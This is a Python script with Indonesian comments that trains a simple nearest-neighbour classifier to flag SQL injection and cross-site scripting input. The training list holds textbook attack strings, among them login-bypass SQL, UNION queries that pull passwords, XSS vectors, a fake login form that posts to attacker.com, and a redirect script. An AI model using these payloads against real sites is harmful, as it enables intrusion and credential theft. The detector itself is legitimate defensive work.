# ================ 1 install library ====================
# python3.10 -m pip install pandas scikit-learn

import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.neighbors import NearestNeighbors
import argparse

# === 1. Load Dataset ===
dataset = [
    "username='1' or '1' = 1 -- &passwd=", 
    "' OR '1'='1", 
    "<script>alert('XSS');</script>", 
    "admin' --",
    '" OR 1=1 --', "SELECT * FROM users WHERE name = '' OR '1'='1'",
    "<img src=x onerror=alert(1)>", "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert('XSS');'></iframe>",
    "UNION SELECT username, password FROM users", "<body onload=alert('XSS')>",
    "' OR 'a'='a", 
    "<a href='javascript:alert('XSS')'>Click</a>",
    "<form action='http://attacker.com' method='POST'><input type='text' name='user'><input type='password' name='pass'><input type='submit' value='Login'></form>",
    "<script>document.body.innerHTML='Hacked!';</script>",
    "<script>window.location='https://imigrasipura.id/'</script>"
]
labels = [1] * len(dataset)  # 1 berarti serangan (malicious)

df = pd.DataFrame({'payload': dataset, 'label': labels})

# === 2. TF-IDF Vectorization ===
vectorizer = TfidfVectorizer()
X = vectorizer.fit_transform(df['payload'])  # Ubah payload menjadi vektor numerik

# === 3. Model k-NN untuk Deteksi Serangan ===
model = NearestNeighbors(n_neighbors=1, metric='cosine')
model.fit(X)

# === 4. Fungsi Deteksi ===
def detect_attack(input_text):
    input_vector = vectorizer.transform([input_text])  # Konversi input ke vektor
    distance, _ = model.kneighbors(input_vector)  # Cari kemiripan dengan dataset

    threshold = 0.2  # Jika jarak terlalu kecil (artinya mirip), anggap serangan
    is_attack = distance[0][0] < threshold
    return is_attack

# === 5. Contoh Pengujian ===
test_inputs = [
    "' OR '1'='1 --",  # SQL Injection mirip dengan dataset
    "<script>alert('test');</script>",  # XSS mirip dengan dataset
    "Hello, how are you?",  # Bukan serangan
    "SELECT * FROM admin WHERE user='admin' --",  # SQL Injection baru
]

#for test in test_inputs:
#    print(f"Input: {test} -> Deteksi: {detect_attack(test)}")

parser = argparse.ArgumentParser(description="Program menerima parameter string.")
parser.add_argument("text", type=str, help="Masukkan teks sebagai parameter")
args = parser.parse_args()

print(f"OUTPUT: {detect_attack(args.text)}")
